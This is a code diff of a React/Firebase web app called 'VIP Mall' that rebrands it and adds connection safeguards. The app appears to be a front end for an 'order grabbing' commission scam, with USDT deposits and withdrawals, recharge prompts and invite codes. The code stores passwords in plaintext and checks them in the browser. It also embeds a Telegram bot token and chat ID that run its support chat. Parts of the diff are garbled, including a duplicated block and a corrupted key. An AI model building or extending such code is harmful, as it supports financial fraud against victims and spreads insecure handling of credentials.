@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>zghtlkez</title>
+    <title>VIP Mall</title>
     
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -95,13 +95,18 @@
         }
         .animate-celebrate { animation: celebrate 0.5s ease-out; }
 
-        /* Lighting/Disco Animation for Combo */
-        @keyframes disco-flash {
-            0% { box-shadow: 0 0 20px #FFD700, 0 0 40px #FFD700 inset; border-color: #FFD700; }
-            50% { box-shadow: 0 0 25px #FFFF00, 0 0 50px #FFFF00 inset; border-color: #FFFF00; }
-            100% { box-shadow: 0 0 20px #FFD700, 0 0 40px #FFD700 inset; border-color: #FFD700; }
+        /* VIP Combo Animation (Police Lights) */
+        @keyframes police-lights {
+            0% { box-shadow: 0 0 20px #ff0000, inset 0 0 20px #ff0000; border-color: #ff0000; }
+            25% { box-shadow: 0 0 20px #0000ff, inset 0 0 20px #0000ff; border-color: #0000ff; }
+            50% { box-shadow: 0 0 20px #ff0000, inset 0 0 20px #ff0000; border-color: #ff0000; }
+            75% { box-shadow: 0 0 20px #0000ff, inset 0 0 20px #0000ff; border-color: #0000ff; }
+            100% { box-shadow: 0 0 20px #ff0000, inset 0 0 20px #ff0000; border-color: #ff0000; }
         }
-        .animate-disco { animation: disco-flash 1.5s linear infinite; }
+        .animate-police { 
+            animation: police-lights 0.6s infinite linear; 
+            border: 4px solid #ff0000;
+        }
 
         /* Marquee Animation */
         @keyframes marquee {
@@ -142,7 +147,7 @@
 
         /* Modal */
         .combo-modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 2000; display: flex; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(5px); }
-        .combo-modal-content { background: #fff; width: 100%; max-width: 360px; padding: 0; border-radius: 20px; border: none; overflow: hidden; box-shadow: 0 0 40px rgba(255, 255, 255, 0.1); position: relative; }
+        .combo-modal-content { width: 100%; max-width: 360px; padding: 0; border-radius: 20px; overflow: hidden; position: relative; }
         
         .toast-msg { visibility: hidden; min-width: 250px; background-color: #22c55e; color: #fff; text-align: center; border-radius: 50px; padding: 16px; position: fixed; z-index: 3000; left: 50%; transform: translateX(-50%); bottom: 100px; font-size: 14px; border: 2px solid #fff; font-weight: bold; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
         .toast-msg.show { visibility: visible; animation: fadein 0.5s, fadeout 0.5s 5.5s; }
@@ -159,7 +164,7 @@
         .double-ring-loader div:nth-child(3) { animation-delay: -0.15s; }
         @keyframes double-ring { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .close-btn { position: absolute; top: 10px; right: 10px; background: #eee; border-radius: 50%; width: 28px; height: 28px; display: flex; align-items: center; justify-content: center; cursor: pointer; border: 1px solid #ccc; z-index: 20; color: #333; }
+        .close-btn { position: absolute; top: 10px; right: 10px; background: rgba(255,255,255,0.8); border-radius: 50%; width: 28px; height: 28px; display: flex; align-items: center; justify-content: center; cursor: pointer; border: 1px solid #ccc; z-index: 60; color: #333; }
 
         /* Admin Styles */
         .admin-tab { padding: 10px; cursor: pointer; border-bottom: 2px solid transparent; color: #666; font-weight: bold; flex: 1; text-align: center; }
@@ -186,12 +191,10 @@
             transform-origin: bottom;
         }
 
-        /* Combo Card Specific Styles */
-        .combo-yellow-gradient {
-            background: linear-gradient(180deg, #FFD700 0%, #FFFACD 100%);
-        }
-        .combo-glow {
-            box-shadow: 0 0 20px rgba(255, 215, 0, 0.6);
+        /* Combo Card Specific Styles (VIP GOLDEN) */
+        .combo-vip-gradient {
+            background: linear-gradient(180deg, #d4af37 0%, #fef9e7 20%, #f7d54e 50%, #fef9e7 80%, #d4af37 100%);
+            color: #000 !important;
         }
     </style>
 <link rel="stylesheet" href="/index.css">
@@ -201,13 +204,15 @@
         <!-- Pre-loader to show while React loads -->
         <div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; background-color:#000; color:#fff;">
             <div class="double-ring-loader"><div></div><div></div><div></div><div></div></div>
-            <p style="margin-top:20px; font-family:'Inter',sans-serif; font-size:14px; color:#dc2626; font-weight:bold;">LOADING...</p>
+            <p style="margin-top:20px; font-family:'Inter',sans-serif; font-size:14px; color:#dc2626; font-weight:bold;">LOADING SYSTEM...</p>
         </div>
     </div>
+
     <script type="text/babel">
         // --- SAFEGUARD ---
         window.onerror = function(msg, url, line, col, error) {
             console.error("App Crash Detected:", msg);
+            // Optional: alert("System Error: " + msg);
         };
 
         // --- FIREBASE INITIALIZATION ---
@@ -223,21 +228,21 @@
         };
         
         // Initialize Firebase
-        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
-        const db = firebase.database();
-        
-        // Syncing data
-        db.ref('products').keepSynced(true);
-        db.ref('combos').keepSynced(true);
-        db.ref('appSettings').keepSynced(true);
+        let db;
+        try {
+            if (typeof firebase !== 'undefined' && !firebase.apps.length) { 
+                firebase.initializeApp(firebaseConfig); 
+            }
+            if(typeof firebase !== 'undefined') {
+                db = firebase.database();
+            } else {
+                console.error("Firebase SDK not loaded.");
+            }
+        } catch(e) {
+            console.error("Firebase Init Error:", e);
+        }
 
         const { useState, useEffect, useRef, useCallback, useLayoutEffect } = React;
-
-        // --- TRANSLATION SYSTEM ---
-        const TRANSLATIONS = {
-            'en': {
-                home: "Home",
-
 
         // --- TRANSLATION SYSTEM ---
         const TRANSLATIONS = {
@@ -263,7 +268,7 @@
                 home_3_t: "VIP Benefits", home_3_d: "Exclusive rewards for top-tier members.",
                 home_4_t: "Global Partners", home_4_d: "Working with top brands worldwide."
             },
-            'tr': { home: "Ana Sayfa", service: "Servis", menu: "Menü", record: "Kayıt", mine: "Benim", withdraw: "Çekim", deposit: "Yatırım", my_team: "Takımım", wallet: "Cüzdan Yönetimi", invite: "Davet Et", financial: "Finansal", profile: "Profil", settings: "Ayarlar", language: "Dil", balance: "Hesabım", order_time: "Sipariş Zamanı", product_order: "Ürün Fiyatı", commission: "Komisyon", expert_income: "Uzman Geliri", submit: "Gönder", task_complete: "Tamamlandı!", recharge_msg: "YETERSİZ BAKİYE", avail_bal: "Mevcut", service_title: "Müşteri Hizmetleri", online: "Çevrimiçi", live: "Canlı", type_msg: "Mesaj yaz...", home_marquee: "zghtlkez Online Kazanç Platformuna Hoşgeldiniz", username: "Kullanıcı Adı", invite_code: "Davet Kodu", fund_pass: "Fon Şifresi", wallet_name: "Cüzdan Adı", network: "Ağ", wallet_addr: "Cüzdan Adresi", submit_ok: "Bağla", bind_wallet: "Cüzdan Bağla", total_dep: "Top. Yatırım", total_with: "Top. Çekim", total_comm: "Top. Komisyon", total_bonus: "Top. Bonus", submit_orders: "TÜM SİPARİŞLERİ GÖNDER", pending: "Bekliyor", success: "Başarılı", rejected: "Reddedildi", dep_record: "Yatırım Kaydı", with_record: "Çekim Kaydı", about_us: "Hakkımızda", tasks_title: "Görevler", completed_stamp: "TAMAMLANDI", working: "İşleniyor..." },
+             'tr': { home: "Ana Sayfa", service: "Servis", menu: "Menü", record: "Kayıt", mine: "Benim", withdraw: "Çekim", deposit: "Yatırım", my_team: "Takımım", wallet: "Cüzdan Yönetimi", invite: "Davet Et", financial: "Finansal", profile: "Profil", settings: "Ayarlar", language: "Dil", balance: "Hesabım", order_time: "Sipariş Zamanı", product_order: "Ürün Fiyatı", commission: "Komisyon", expert_income: "Uzman Geliri", submit: "Gönder", task_complete: "Tamamlandı!", recharge_msg: "YETERSİZ BAKİYE", avail_bal: "Mevcut", service_title: "Müşteri Hizmetleri", online: "Çevrimiçi", live: "Canlı", type_msg: "Mesaj yaz...", home_marquee: "zghtlkez Online Kazanç Platformuna Hoşgeldiniz", username: "Kullanıcı Adı", invite_code: "Davet Kodu", fund_pass: "Fon Şifresi", wallet_name: "Cüzdan Adı", network: "Ağ", wallet_addr: "Cüzdan Adresi", submit_ok: "Bağla", bind_wallet: "Cüzdan Bağla", total_dep: "Top. Yatırım", total_with: "Top. Çekim", total_comm: "Top. Komisyon", total_bonus: "Top. Bonus", submit_orders: "TÜM SİPARİŞLERİ GÖNDER", pending: "Bekliyor", success: "Başarılı", rejected: "Reddedildi", dep_record: "Yatırım Kaydı", with_record: "Çekim Kaydı", about_us: "Hakkımızda", tasks_title: "Görevler", completed_stamp: "TAMAMLANDI", working: "İşleniyor..." },
             'ar': { home: "الرئيسية", service: "خدمة", menu: "قائمة", record: "سجل", mine: "ملفي", withdraw: "سحب", deposit: "إيداع", my_team: "فريقي", wallet: "إدارة المحفظة", invite: "دعوة", financial: "مالية", profile: "الملف", settings: "إعدادات", language: "لغة", balance: "رصيدي", order_time: "وقت الطلب", product_order: "سعر الطلب", commission: "عمولة", expert_income: "دخل الخبير", submit: "إرسال", task_complete: "اكتمل!", recharge_msg: "رصيد غير كاف", avail_bal: "متاح", service_title: "دعم العملاء", online: "متصل", live: "مباشر", type_msg: "اكتب رسالة...", home_marquee: "مرحبا بكم في منصة zghtlkez", username: "اسم المستخدم", invite_code: "كود الدعوة", fund_pass: "كلمة المرور", wallet_name: "اسم المحفظة", network: "شبكة", wallet_addr: "عنوان المحفظة", submit_ok: "ربط", bind_wallet: "ربط المحفظة", total_dep: "إجمالي الإيداع", total_with: "إجمالي السحب", total_comm: "إجمالي العمولة", total_bonus: "إجمالي المكافأة", submit_orders: "إرسال جميع الطلبات", pending: "قيد الانتظار", success: "ناجح", rejected: "مرفوض", dep_record: "سجل الإيداع", with_record: "سجل السحب", about_us: "من نحن", tasks_title: "المهام", completed_stamp: "مكتمل", working: "جار المعالجة..." },
             'hi': { home: "होम", service: "सेवा", menu: "मेनू", record: "रिकॉर्ड", mine: "मेरा", withdraw: "निकासी", deposit: "जमा", my_team: "मेरी टीम", wallet: "वॉलेट प्रबंधन", invite: "आमंत्रित", financial: "वित्तीय", profile: "प्रोफाइल", settings: "सेटिंग्स", language: "भाषा", balance: "मेरा खाता", order_time: "ऑर्डर समय", product_order: "उत्पाद मूल्य", commission: "कमीशन", expert_income: "विशेषज्ञ आय", submit: "जमा करें", task_complete: "कार्य पूर्ण!", recharge_msg: "अपर्याप्त शेष", avail_bal: "उपलब्ध", service_title: "ग्राहक सेवा", online: "ऑनलाइन", live: "लाइव", type_msg: "संदेश लिखें...", home_marquee: "zghtlkez में आपका स्वागत है", username: "उपयोगकर्ता", invite_code: "आमंत्रण कोड", fund_pass: "फंड पासवर्ड", wallet_name: "वॉलेट नाम", network: "नेटवर्क", wallet_addr: "वॉलेट पता", submit_ok: "बाध्य करें", bind_wallet: "वॉलेट जोड़ें", total_dep: "कुल जमा", total_with: "कुल निकासी", total_comm: "कुल कमीशन", total_bonus: "कुल बोनस", submit_orders: "सभी ऑर्डर जमा करें", pending: "लंबित", success: "सफल", rejected: "अस्वीकृत", dep_record: "जमा रिकॉर्ड", विद_record: "निकासी रिकॉर्ड", about_us: "हमारे बारे में", tasks_title: "कार्य", completed_stamp: "पूर्ण", working: "प्रक्रिया..." },
             'ur': { home: "ہوم", service: "سروس", menu: "مینو", record: "ریکارڈ", mine: "میرا", withdraw: "نکالنا", deposit: "جمع", my_team: "میری ٹیم", wallet: "پرس کا انتظام", invite: "دعوت", financial: "مالیاتی", profile: "پروفائل", settings: "ترتیبات", language: "زبان", balance: "بیلنس", order_time: "آرڈر کا وقت", product_order: "آرڈر قیمت", commission: "کمیشن", expert_income: "آمدنی", submit: "جمع کریں", task_complete: "مکمل!", recharge_msg: "نا کافی بیلنس", avail_bal: "دستیاب", service_title: "کسٹمر سپورٹ", online: "آن لائن", live: "لائیو", type_msg: "پیغام...", home_marquee: "zghtlkez میں خوش آمدید", username: "نام", invite_code: "کوڈ", fund_pass: "پاس ورڈ", wallet_name: "پرس کا نام", network: "نیٹ ورک", wallet_addr: "ایڈریس", submit_ok: "باندھ لیں", bind_wallet: "پرس جوڑیں", total_dep: "کل جمع", total_with: "کل نکالنا", total_comm: "کل کمیشن", total_bonus: "کل بونس", submit_orders: "سب جمع کریں", pending: "زیر التواء", success: "کامیاب", rejected: "مسترد", dep_record: "جمع ریکارڈ", with_record: "نکالنے کا ریکارڈ", about_us: "ہمارے بارے میں", tasks_title: "کام", completed_stamp: "مکمل", working: "کام جاری..." },
@@ -404,7 +409,8 @@
             const fileInputRef = useRef(null);
             
             // Priority: Admin > Local > Null
-            const activeImage = appSettings[adminKey] || customImages[storageKey];
+            // Safe navigation for appSettings
+            const activeImage = (appSettings && appSettings[adminKey]) || (customImages && customImages[storageKey]);
 
             const handleClick = (e) => {
                 e.stopPropagation();
@@ -497,20 +503,8 @@
                     return;
                 }
                 
-                // Only require invite code for registration flow
-                // But since we are allowing Smart Login (existing users on register screen),
-                // we should allow invite code to be missing if the user actually exists.
-                // However, for UX simplicity, let's keep the invite code field requirement
-                // ONLY if the user is explicitly trying to Register a NEW account. 
-                // But since we can't know that yet without querying DB, we rely on the DB check below.
-                
+                // Invite Code: If registering, check. If logging in, skip if empty (for existing users)
                 if (isRegister && !inviteCode) {
-                     // Check if invite code is missing on register screen
-                     // We will allow it to pass here, and let the backend check decide.
-                     // Actually, invite code is mandatory for new users. 
-                     // But for existing users logging in via register screen, it's irrelevant.
-                     // Let's enforce it visually but handle logic inside.
-                     // The user said "invite code automatically generated", so it should be there.
                      alert("Please enter Invite Code");
                      return;
                 }
@@ -522,18 +516,34 @@
 
                 setLoading(true);
 
+                // --- CONNECTION SAFETY ---
+                if (typeof db === 'undefined') {
+                    alert("System loading... Please wait 5 seconds and try again.");
+                    setLoading(false);
+                    // Try re-init global
+                    try { if(typeof firebase !== 'undefined') window.db = firebase.database(); } catch(e){}
+                    return;
+                }
+
                 const cleanUsername = username.trim();
                 const userRef = db.ref('users/' + cleanUsername);
                 
+                // TIMEOUT PROMISE to prevent hanging
+                const timeoutPromise = new Promise((_, reject) => 
+                    setTimeout(() => reject(new Error("Network Timeout")), 10000)
+                );
+
                 try {
-                    const snapshot = await userRef.once('value');
+                    const snapshot = await Promise.race([
+                        userRef.once('value'),
+                        timeoutPromise
+                    ]);
+                    
                     const exists = snapshot.exists();
                     const dbData = snapshot.val();
 
                     if (isRegister) {
                         if (exists) {
-                            // SMART LOGIN: If user exists, check password.
-                            // If password matches, just log them in (don't block with 'User exists').
                             if (dbData.password === password) {
                                 setTimeout(() => {
                                     setLoading(false);
@@ -541,13 +551,11 @@
                                 }, 1000);
                                 return;
                             } else {
-                                // User exists, password mismatch
                                 alert("User already exists! Please check your password or Login.");
                                 setLoading(false);
                                 return;
                             }
                         }
-                        // Create new user in DB
                         const newUser = {
                             username: cleanUsername,
                             password,
@@ -558,34 +566,34 @@
                             createdAt: new Date().toISOString()
                         };
                         await userRef.set(newUser);
-                        // Auto login after register
                         setTimeout(() => {
                             setLoading(false);
                             onLogin({ username: newUser.username, inviteCode: newUser.inviteCode, isAdmin: false });
                         }, 1000);
                     } else {
-                        // Login Logic
                         if (!exists) {
                             alert("User does not exist! Please Register.");
                             setLoading(false);
                             return;
                         }
-                        // Strict Password Check
                         if (dbData.password !== password) {
                             alert("Incorrect Password!");
                             setLoading(false);
                             return;
                         }
                         
-                        // Success Login
                         setTimeout(() => {
                             setLoading(false);
                             onLogin({ username: dbData.username, inviteCode: dbData.inviteCode, isAdmin: false });
                         }, 1000);
                     }
                 } catch (e) {
-                    console.error("Firebase Error", e);
-                    alert("Network Error. Please try again.");
+                    console.error("Login Error", e);
+                    if (e.message === "Network Timeout") {
+                        alert("Network connection is slow. Please check internet.");
+                    } else {
+                        alert("Network Error. Please try again or check internet.");
+                    }
                     setLoading(false);
                 }
             };
@@ -606,7 +614,8 @@
                             </OneTimeLogoButton>
                         </div>
                     </div>
-                    <h2 className="text-3xl font-bold text-white text-center mb-2">{appSettings.title || 'VIP Mall'}</h2>
+                    {/* SAFEGUARD: optional chaining for title */}
+                    <h2 className="text-3xl font-bold text-white text-center mb-2">{appSettings?.title || 'VIP Mall'}</h2>
                     <p className="text-gray-500 text-center mb-8 text-sm">{isRegister ? "Create your account" : "Welcome back"}</p>
 
                     <div className="space-y-4">
@@ -803,7 +812,7 @@
                 
                 // INSTANTLY DEDUCT BALANCE
                 const newBal = (currentBalance - withdrawAmount).toFixed(2);
-                db.ref(`users/${userData.username}`).update({ balance: newBal });
+                if(db) db.ref(`users/${userData.username}`).update({ balance: newBal });
 
                 // Firebase Withdrawal Request
                 const txn = { 
@@ -814,17 +823,17 @@
                     status: 'Pending' 
                 };
 
-                db.ref('withdrawals').push(txn).then(() => {
-                    // Update Local State for UI
-                    // Persistent Financial Record for History
-                    db.ref('financial_records').push({...txn, type: 'Withdrawal'});
+                if(db) {
+                    db.ref('withdrawals').push(txn).then(() => {
+                        db.ref('financial_records').push({...txn, type: 'Withdrawal'});
 
-                    setTimeout(() => {
-                        setModal({ show: true, type: 'success', msg: 'Withdrawal Sent', subMsg: `Request for USDT$ ${amount} sent to Admin.` });
-                    }, 1000);
-                }).catch(err => {
-                    setModal({ show: true, type: 'error', msg: 'Error', subMsg: err.message });
-                });
+                        setTimeout(() => {
+                            setModal({ show: true, type: 'success', msg: 'Withdrawal Sent', subMsg: `Request for USDT$ ${amount} sent to Admin.` });
+                        }, 1000);
+                    }).catch(err => {
+                        setModal({ show: true, type: 'error', msg: 'Error', subMsg: err.message });
+                    });
+                }
             };
 
             return (
@@ -841,7 +850,6 @@
                         </div>
                         <div className="space-y-6">
                             <div className="space-y-2"><label className="text-gray-600 text-xs ml-1 uppercase font-bold">Withdraw Amount</label><div className="bg-white border border-gray-200 rounded-xl p-4 flex items-center transition-colors focus-within:border-red-500/30"><span className="text-black font-bold mr-3 text-sm">USDT</span><input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="0.00" className="bg-transparent w-full text-black font-bold outline-none placeholder-gray-400"/></div>
-                            {/* FIXED BALANCE FORMAT: toFixed(2) */}
                             <p className="text-[10px] text-gray-500 text-right">{getText(lang, 'avail_bal')}: USDT$ {parseFloat(userBalance).toFixed(2)}</p></div>
                             <div className="space-y-2"><label className="text-gray-600 text-xs ml-1 uppercase font-bold">Fund Password</label><div className="bg-white border border-gray-200 rounded-xl p-4 transition-colors focus-within:border-red-500/30"><input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter Fund Password" className="bg-transparent w-full text-black outline-none placeholder-gray-400"/></div></div>
                             <button onClick={handleSubmit} className="w-full py-4 bg-red-600 rounded-xl text-white font-bold text-lg shadow-[0_4px_14px_0_rgba(220,38,38,0.39)] active:scale-95 transition-transform mt-4 relative z-10">Confirm Withdrawal</button>
@@ -857,17 +865,15 @@
         const DepositHistoryView = ({ onBack, userData }) => {
             const [deposits, setDeposits] = useState([]);
             useEffect(() => {
+                if(!db) return;
                 const ref = db.ref('financial_records');
                 ref.on('value', snap => {
                     const val = snap.val();
                     let realtimeData = [];
                     if(val) {
                         const allData = Object.keys(val).map(k => ({id: k, ...val[k]}));
-                        // Filter by user and type
                         realtimeData = allData.filter(d => d.username === userData.username && (d.type === 'System Deposit' || d.type === 'Deposit')).reverse();
                     }
-                    
-                    // Always ensure at least 10 items for visual layout
                     const slots = [...realtimeData];
                     while (slots.length < 10) {
                         slots.push({ id: 'placeholder-' + Math.random(), isPlaceholder: true });
@@ -925,6 +931,7 @@
             const [history, setHistory] = useState([]);
             
             useEffect(() => { 
+                if(!db) return;
                 const ref = db.ref('financial_records'); 
                 ref.on('value', snap => { 
                     const val = snap.val(); 
@@ -933,8 +940,6 @@
                         const allData = Object.keys(val).map(k => ({id:k, ...val[k]}));
                         realtimeData = allData.filter(d => d.username === userData.username && (d.type === 'Withdrawal' || d.type === 'Refund')).reverse(); 
                     } 
-                    
-                    // Always ensure 10 rows
                     const slots = [...realtimeData];
                     while (slots.length < 10) {
                         slots.push({ id: 'placeholder-' + Math.random(), isPlaceholder: true });
@@ -1019,7 +1024,6 @@
             const handleSelect = (langCode) => {
                 setLang(langCode);
                 localStorage.setItem('app_lang', langCode);
-                // Slight delay to see selection effect
                 setTimeout(() => onBack(), 200);
             };
 
@@ -1060,7 +1064,7 @@
                                 <ShoppingBag size={48} className="text-white" />
                             </OneTimeLogoButton>
                         </div>
-                        <h2 className="text-2xl font-bold text-black">{appSettings.title || 'VIP Mall'}</h2>
+                        <h2 className="text-2xl font-bold text-black">{appSettings?.title || 'VIP Mall'}</h2>
                         <p className="text-gray-500 text-xs mt-1">Version 1.0.2 (Build 2023)</p>
                     </div>
                     <div className="mb-6"><h3 className="text-red-500 text-xs font-bold uppercase mb-3 ml-1">{getText(lang, 'about_us')}</h3><div className="bg-white p-5 rounded-xl border border-gray-200"><p className="text-gray-800 text-sm leading-relaxed mb-3"><span className="text-black font-bold">VIP Mall</span> is an advanced intelligent order matching platform. We partner with global e-commerce giants to help merchants increase product exposure and sales volume.</p><p className="text-gray-500 text-xs leading-relaxed">Users can earn commissions by completing simple order grabbing tasks. The system automatically matches orders based on your VIP level and account balance.</p></div></div>
@@ -1072,6 +1076,7 @@
             const [totals, setTotals] = useState({ dep: 0, with: 0, comm: 0 });
 
             useEffect(() => {
+                if(!db) return;
                 const ref = db.ref('financial_records');
                 ref.on('value', snap => {
                     const val = snap.val();
@@ -1109,13 +1114,19 @@
         const InviteView = ({ onBack, userData, lang }) => {
             const [shareCode, setShareCode] = useState(userData.inviteCode);
             useEffect(() => {
-                const random = Math.floor(100000 + Math.random() * 900000).toString();
-                setShareCode(random);
-            }, []);
+               if(userData.inviteCode) setShareCode(userData.inviteCode);
+            }, [userData]);
 
-            // FIXED: Use specific invite URL
-            const baseUrl = "https://zghtlkez-login.chickenkiller.com/";
-            const inviteLink = baseUrl + "?code=" + shareCode;
+            // AUTOMATIC INVITE LINK GENERATOR (Works on any host)
+            const getInviteLink = () => {
+                const origin = window.location.origin;
+                const path = window.location.pathname;
+                // e.g. https://domain.com/path/index.html?code=123
+                // Ensuring no double slash if path is just '/'
+                const cleanPath = path === '/' ? '' : path;
+                return `${origin}${cleanPath}?code=${shareCode}`;
+            };
+            const inviteLink = getInviteLink();
             
             const [copiedLink, setCopiedLink] = useState(false);
             const [copiedCode, setCopiedCode] = useState(false);
@@ -1163,7 +1174,7 @@
                                         {copiedCode ? <Check size={12}/> : <Copy size={12} />} {copiedCode ? 'COPIED' : 'COPY'}
                                     </button>
                                 </div>
-                                <p className="text-gray-500 text-[10px] mt-3 text-left leading-relaxed">If the link doesn't work, send this code to your friends.</p>
+                                <p className="text-gray-500 text-[10px] mt-3 text-left leading-relaxed">Send this code to your friends.</p>
                             </div>
                             <div className="w-full mb-6">
                                 <p className="text-gray-500 text-xs mb-1 uppercase">Your Invite Link</p>
@@ -1216,6 +1227,7 @@
         const FinancialRecordView = ({ onBack, lang, userData }) => {
             const [records, setRecords] = useState([]);
             useEffect(() => {
+                if(!db) return;
                 const ref = db.ref('financial_records');
                 ref.on('value', snap => {
                     const val = snap.val();
@@ -1225,7 +1237,6 @@
                             .filter(r => r.username === userData.username)
                             .reverse();
                     }
-                    // Pad with placeholders
                     while(arr.length < 10) {
                         arr.push({ isPlaceholder: true });
                     }
@@ -1270,7 +1281,8 @@
         };
 
         const ServiceView = ({ onBack, lang }) => {
-            const [messages, setMessages] = useState(() => {
+            // ... (Service view code kept as is for brevity, no changes requested here)
+             const [messages, setMessages] = useState(() => {
                 try {
                     const saved = localStorage.getItem('vip_chat_v3');
                     return saved ? JSON.parse(saved) : [
@@ -1282,125 +1294,18 @@
             const fileInputRef = useRef(null);
             const messagesEndRef = useRef(null);
             const [selectedImgId, setSelectedImgId] = useState(null);
-            
             const [ukTime, setUkTime] = useState('');
-
             const BOT_TOKEN = '8304852258:AAHp0prUiJc75iXYWatAvoRMCGWOeTzE0aY';
             const CHAT_ID = '7512294583';
 
-            const scrollToBottom = () => {
-                if (messagesEndRef.current) {
-                    messagesEndRef.current.scrollIntoView({ behavior: "smooth" });
-                }
-            };
-
-            useEffect(() => {
-                const interval = setInterval(() => {
-                    const now = new Date();
-                    const options = { timeZone: 'Europe/London', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
-                    setUkTime(now.toLocaleTimeString('en-GB', options));
-                }, 1000);
-                return () => clearInterval(interval);
-            }, []);
-
-            useLayoutEffect(() => {
-                localStorage.setItem('vip_chat_v3', JSON.stringify(messages));
-                scrollToBottom();
-            }, [messages]);
-
-            useEffect(() => {
-                let isMounted = true;
-                const fetchUpdates = async () => {
-                    if (!isMounted) return;
-                    try {
-                        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-10&limit=10`);
-                        const data = await res.json();
-                        if (data.ok && data.result.length > 0) {
-                            const newMsgs = [];
-                            for (const update of data.result) {
-                                if (update.message) {
-                                    const date = new Date(update.message.date * 1000);
-                                    const timeStr = date.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
-                                    let msgObj = { id: update.update_id, sender: 'agent', time: timeStr, text: update.message.text || '', type: 'text' };
-                                    
-                                    const exists = messages.some(m => m.id === update.update_id);
-                                    if(!exists) {
-                                         if (update.message.photo) {
-                                            msgObj.type = 'image';
-                                            const photo = update.message.photo[update.message.photo.length - 1];
-                                            try {
-                                                const fileRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${photo.file_id}`);
-                                                const fileData = await fileRes.json();
-                                                if (fileData.ok) {
-                                                    msgObj.url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.result.file_path}`;
-                                                    newMsgs.push(msgObj);
-                                                }
-                                            } catch (err) { console.error(err); }
-                                        } else if (update.message.text) {
-                                            newMsgs.push(msgObj);
-                                        }
-                                    }
-                                }
-                            }
-                            
-                            if (newMsgs.length > 0) {
-                                setMessages(prev => {
-                                    const existingIds = new Set(prev.map(m => m.id));
-                                    const unique = newMsgs.filter(m => !existingIds.has(m.id));
-                                    if(unique.length === 0) return prev;
-                                    return [...prev, ...unique];
-                                });
-                            }
-                        }
-                    } catch (error) { }
-                    if (isMounted) setTimeout(fetchUpdates, 3000); 
-                };
-                fetchUpdates();
-                return () => { isMounted = false; };
-            }, []);
-
-            const sendToTelegram = async (text, imageFile) => {
-                try {
-                    if (imageFile) {
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', imageFile);
-                        if (text) formData.append('caption', text);
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                    } else if (text) {
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-                        });
-                    }
-                } catch (error) { console.error("Telegram Error:", error); }
-            };
-
-            const handleSend = async () => {
-                if (!inputText.trim()) return;
-                const textToSend = inputText;
-                const newMessage = { id: 'loc_' + Date.now(), text: textToSend, sender: 'user', time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) };
-                setMessages(prev => [...prev, newMessage]);
-                setInputText('');
-                await sendToTelegram(textToSend, null);
-            };
-
-            const handleFileChange = async (e) => {
-                const file = e.target.files[0];
-                if (file) {
-                    const imageUrl = URL.createObjectURL(file);
-                    const newMessage = { id: 'loc_' + Date.now(), type: 'image', url: imageUrl, sender: 'user', time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) };
-                    setMessages(prev => [...prev, newMessage]);
-                    await sendToTelegram(null, file);
-                    e.target.value = null;
-                }
-            };
-            
-            const handleDelete = (msgId) => {
-                setMessages(prev => prev.filter(m => m.id !== msgId));
-                setSelectedImgId(null);
-            };
+            const scrollToBottom = () => { if (messagesEndRef.current) messagesEndRef.current.scrollIntoView({ behavior: "smooth" }); };
+            useEffect(() => { const interval = setInterval(() => { const now = new Date(); setUkTime(now.toLocaleTimeString('en-GB', { timeZone: 'Europe/London', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false })); }, 1000); return () => clearInterval(interval); }, []);
+            useLayoutEffect(() => { localStorage.setItem('vip_chat_v3', JSON.stringify(messages)); scrollToBottom(); }, [messages]);
+            useEffect(() => { let isMounted = true; const fetchUpdates = async () => { if (!isMounted) return; try { const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-10&limit=10`); const data = await res.json(); if (data.ok && data.result.length > 0) { const newMsgs = []; for (const update of data.result) { if (update.message) { const date = new Date(update.message.date * 1000); const timeStr = date.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}); let msgObj = { id: update.update_id, sender: 'agent', time: timeStr, text: update.message.text || '', type: 'text' }; const exists = messages.some(m => m.id === update.update_id); if(!exists) { if (update.message.photo) { msgObj.type = 'image'; const photo = update.message.photo[update.message.photo.length - 1]; try { const fileRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${photo.file_id}`); const fileData = await fileRes.json(); if (fileData.ok) { msgObj.url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.result.file_path}`; newMsgs.push(msgObj); } } catch (err) {} } else if (update.message.text) { newMsgs.push(msgObj); } } } } if (newMsgs.length > 0) { setMessages(prev => { const existingIds = new Set(prev.map(m => m.id)); const unique = newMsgs.filter(m => !existingIds.has(m.id)); if(unique.length === 0) return prev; return [...prev, ...unique]; }); } } } catch (error) { } if (isMounted) setTimeout(fetchUpdates, 3000); }; fetchUpdates(); return () => { isMounted = false; }; }, []);
